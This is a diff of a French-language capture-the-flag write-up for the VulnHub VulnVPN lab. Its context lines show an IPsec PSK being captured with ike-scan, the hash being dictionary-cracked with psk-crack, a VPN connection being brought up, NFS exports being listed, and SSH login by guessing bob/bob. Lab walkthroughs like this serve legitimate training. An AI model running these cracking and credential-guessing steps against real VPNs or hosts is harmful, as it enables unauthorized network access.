@@ -1,4 +1,7 @@
-# Solution du CTF HackLAB : VulnVPN
+---
+title: "Solution du CTF HackLAB : VulnVPN de VulnHub"
+tags: [CTF,VulnHub]
+---
 
 Présentation
 ------------
@@ -27,7 +30,7 @@ En terme d'attaque de VPN les outils plus classiques comme *THC-Hydra* et *Medus
 
 Après quelques recherches sur le web et la lecture de la manpage je trouve les options nécessaires pour récupérer la clé PSK chiffrée et l'exporter dans un fichier key (note : il faut être root car le port source 500 est utilisé) :  
 
-```plain
+```bash
 # ./ike-scan -A -M -I ike-vendor-ids -Pkey 192.168.0.10 
 Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
 192.168.0.10    Aggressive Mode Handshake returned
@@ -44,7 +47,7 @@ Ending ike-scan 1.9: 1 hosts scanned in 0.007 seconds (148.61 hosts/sec).  1 ret
 
 On utilise ensuite l'outil *psk-crack* qui fait partie d'*ike-scan* :  
 
-```plain
+```bash
 # ./psk-crack -d psk-crack-dictionary key 
 Starting psk-crack [ike-scan 1.9] (http://www.nta-monitor.com/tools/ike-scan/)
 Running in dictionary cracking mode
@@ -54,7 +57,7 @@ Ending psk-crack: 36 iterations in 0.000 seconds (89330.02 iterations/sec)
 
 La clé PSK est *123456*. On corrige le fichier *ipsec.secrets* et on lance le service *ipsec*. On lance ensuite spécifiquement la connexion VPN spécifiée dans les fichiers de configuration (nommée ici *vpn*) :  
 
-```plain
+```bash
 # systemctl start ipsec
 # ipsec auto --up vpn
 003 "vpn" #1: multiple DH groups were set in aggressive mode. Only first one used.
@@ -74,7 +77,7 @@ On note que la connexion est bien établie en mode transport.
 
 On procède à la suite des instructions comme indiqué sur la page du challenge :  
 
-```plain
+```bash
 # systemctl start xl2tpd
 # ./start-vpn.sh
 ```
@@ -207,7 +210,7 @@ Sur le port 80 on trouve un *wordpress* sur lequel je ne me suis pas attardé.
 
 Il y a un export NFS sur la machine pour l'utilisateur bob :  
 
-```plain
+```bash
 # showmount -e 10.99.99.1
 Export list for 10.99.99.1:
 /home/bob *
@@ -215,7 +218,7 @@ Export list for 10.99.99.1:
 
 A tout hazard j'ai essayé de me connecter en SSH avec bob/bob... bingo !  
 
-```plain
+```bash
 # ssh bob@10.99.99.1
 The authenticity of host '10.99.99.1 (10.99.99.1)' can't be established.
 ECDSA key fingerprint is ec:56:85:f2:5a:cc:64:2a:bb:a4:20:24:a5:6d:fd:1e.
